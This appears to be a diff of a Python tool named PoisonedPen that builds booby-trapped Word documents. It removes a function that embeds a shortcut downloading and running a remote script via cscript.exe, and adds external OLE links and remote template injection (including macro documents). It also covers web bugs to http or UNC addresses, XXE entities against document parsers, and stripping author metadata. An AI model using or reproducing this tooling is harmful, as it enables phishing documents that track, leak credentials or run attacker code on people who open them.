@@ -15,16 +15,12 @@ class PoisonedPen:
     if not os.path.isfile( docxpath ):
       print('No file at ' + docxpath)
       return False
-    self.doc = Document(docxpath)
-    if self.doc:
-      self.filename = docxpath
-    else:
-      print('Error parsing ' + docxpath + ' into Document object')
-      return False
+    self.filename = docxpath
 
   def get_dom( self, path='word/document.xml' ):
-    x = self.get_xml(path) 
-    d = etree.ElementTree( etree.fromstring( x.encode('utf8') ) )
+    x = self.get_xml(path)
+    if type( x ) is str: x = x.encode('utf8')
+    d = etree.ElementTree( etree.fromstring( x ) )
     return d
 
   # Get the raw XML markup in word/document.xml
@@ -108,7 +104,7 @@ class PoisonedPen:
       rsid = binascii.b2a_hex(os.urandom(4)).decode('utf8').upper()
       if rsid not in settings:
         ok = True
-    rsid = '00CB6E19'
+    # rsid = '00CB6E19'
     # print('Random hex: ' + rsid)
     # rsid = '<w:rsid w:val="00ED3C60"/>'
     el = '<w:rsid w:val="'+rsid+'"/>'
@@ -123,76 +119,26 @@ class PoisonedPen:
     p = '<w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r></w:p>'
     doc = doc.replace("</w:body>", p + "</w:body>" )
     self.contents['word/document.xml'] = doc
-    # contents['word/document.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 wp14"><w:body><w:p w:rsidR="00231807" w:rsidRDefault="000F7C79"><w:r><w:t>This is a totally innocent document</w:t></w:r></w:p><w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="'+rsid+'"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="708" w:footer="708" w:gutter="0"/><w:cols w:space="708"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>'
 
     # self.contents.update( contents )
     print('Inserted web bug, rsid: ' + rsid + ', rid: ' + rid + ', URL: ' + url )
     return True
 
-  # Insert a lnk which does a download and exec of the specified file
-  def insert_ole_dlexec_lnk( self, url ):
-
-    # Some magic cscript call
-    path = 'c:\\Windows\\System32\\cscript.exe "script:'+url+'"'
-    self.insert_olelnk( path )
-
-  # Insert a lnk as an OLE object
-  def insert_olelnk( self, path, icon, caption ):
-    
-    # Create lnk file
-    lnk = pylnk.for_file(path)
-
-    # http://www.mamachine.org/mslink/index.en.html
-    # bin/mslink.sh
-
-    # Write out to tmp dir with random name TODO
-    filepath = tempfile.NamedTemporaryFile().name
-
-    return self.insert_olefile( filepath )
-
   # Insert any file as an OLE object
-  def insert_olefile( self, filepath, icon, caption ):
+  def insert_ole( self, url ):
+    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject', url, 'External' )
+    doc = self.get_xml( 'word/document.xml' )
 
-    # Insert the file as OLE
-    oletmpl = 'resource/oleObject1.bin'
-    tmpolefile = tempfile.NamedTemporaryFile().name 
-    shutil.copy( oletmpl, tmpolefile )
-    ole = olefile.OleFileIO(tmpolefile,write_mode=True)
-    streams = ole.listdir()
-    for s in streams: 
-      print(s, ole.get_size(s))
-    streamname = '\x01Ole10Native'
-    with open(filepath,'rb') as f:
-      size = ole.get_size(streamname)
-      print('Size: ' + str( size ))
-      data = f.read().ljust(size,'\x00')
-      print('Data size: ' + str( len( data ) ))
-      ole.write_stream(streamname, data)
-    
-    # Insert file icon / name
-    tmpemffile = tempfile.NamedTemporaryFile().name 
-    emf = pyemf.EMF(100,70,300)
-    icotmpl = 'resource/' + icon + '.emf'
-    emf.load(icotmpl)
-    emf.TextOut( 10, 80, caption )
-    emf.save(tmpemffile)
-    streamname = '\x03ObjInfo'
-    with open( tmpemffile, 'rb' ) as f:
-      size = ole.get_size(streamname)
-      print('Size: ' + str( size ))
-      data = f.read().ljust(size,'\x00')
-      print('Data size: ' + str( len( data ) ))
-      ole.write_stream(streamname, data)
-    
-    ole.close()
-    intpath = 'word/embeddings/oleObject1.bin'
-    with open( tmpolefile, 'rb' ) as f:
-      self.contents[intpath] = f.read()
+    # Construct a shape which imports the ole object
+    p = '<w:p w14:paraId="720AA3DA" w14:textId="6089DC1A" w:rsidR="00642844" w:rsidRDefault="007E0FA4"><w:pPr><w:spacing w:beforeAutospacing="1" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/><w:rPr><w:sz w:val="30"/><w:szCs w:val="30"/></w:rPr></w:pPr><w:r><w:rPr><w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/><w:b/><w:sz w:val="30"/><w:szCs w:val="30"/><w:u w:val="single"/><w:lang w:eastAsia="en-GB"/></w:rPr><w:t></w:t></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:r><w:rPr><w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/><w:b/><w:sz w:val="30"/><w:szCs w:val="30"/><w:u w:val="single"/><w:lang w:eastAsia="en-GB"/></w:rPr><w:object w:dxaOrig="4320" w:dyaOrig="4320" w14:anchorId="0457A93C"><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:3.75pt" o:ole=""><v:imagedata r:id="rId5" o:title="" cropbottom="64444f" cropright="64444f"/></v:shape><o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="'+rid+'" UpdateMode="OnCall"><o:LinkType>EnhancedMetaFile</o:LinkType><o:LockedField>false</o:LockedField><o:FieldCodes>\f 0</o:FieldCodes></o:OLEObject></w:object></w:r><w:bookmarkEnd w:id="0"/></w:p>'
+    doc = doc.replace("</w:body>", p + "</w:body>" )
+    self.contents['word/document.xml'] = doc
+    print('Inserted external OLE reference, rid: '+rid+', URL: '+url)
 
-    # Get a rid
-    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject', intpath )
-
-    # Insert into document
+  # Insert external template reference
+  def insert_template( self, url ):
+    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate', url, 'External' )
+    print('Inserted external template reference, rid: '+rid+', URL: '+url)
 
   # Strip author info out
   def sanitise( self ):
@@ -219,27 +165,22 @@ def main():
   
   # Command line options
   parser = argparse.ArgumentParser(description="Easily poison Word documents with fun stuff")
-  parser.add_argument("-w", "--webbug", metavar="URL", action="append", help="Insert a web bug to this URL (can be http(s)/UNC, can insert multiple into one doc)" )
-  # parser.add_argument("-o", "--ole-file", metavar="FILEPATH", help="Insert a file from the filesystem as an OLE object" )
-  # parser.add_argument("-l", "--ole-lnk", metavar="URLORPATH", help="Insert a .lnk file as an OLE object to the specified URL / path" )
-  # parser.add_argument("-d", "--ole-dlexec", metavar="URL", help="Insert a .lnk file which downloads and executes the specified URL using c:\Windows\System32\cscript" )
-  # parser.add_argument("-i", "--icon", help="Icon to use when embedding an OLE object", choices=['word','excel'], default='word' )
-  # parser.add_argument("-c", "--caption", help="Caption to write next to file icon (i.e. the file name)", default='Attachment.docx' )
   parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of creating a new one and appending '"+newsuffix+".docx' to the file name" )
   parser.add_argument("-s", "--suffix", help="Suffix to use instead of '"+newsuffix+"' (extension is always preserved)" )
   parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified by, company) from document" )
-  parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
-  # http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html
-  parser.add_argument("-m", "--macro", help="Make this remote macro enabled document load when the docx is opened" )
-  parser.add_argument("--docm", metavar="MACROTXT", help="Generate a .docm file containing this macro" )
-
+  parser.add_argument("-w", "--webbug", metavar="URL", action="append", help="Insert a web bug to this URL (can be http(s)/UNC, can insert multiple into one doc)" )
   # TODO
-  # parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path)" )
+  # parser.add_argument("--docm", metavar="MACROTXT", help="Generate a .docm file containing this macro" )
+  parser.add_argument("--ole", help="Insert an external oleObject reference to this URL / path" )
+  parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path, macro doc)" )
+  parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
   parser.add_argument("documents", nargs="+", help="The word file(s) to poison (supports wildcards)")
   if len( sys.argv)==1:
     parser.print_help()
     sys.exit(1)
   args = parser.parse_args()
+
+  if args.suffix: newsuffix = args.suffix
 
   for docfile in args.documents:
     if not args.replace:
@@ -254,6 +195,12 @@ def main():
     if args.webbug:
       for bug in args.webbug:
         doc.insert_webbug( bug )
+    
+    if args.template:
+      doc.insert_template( args.template )
+
+    if args.ole:
+      doc.insert_ole( args.ole )
 
     if args.sanitise:
       doc.sanitise()
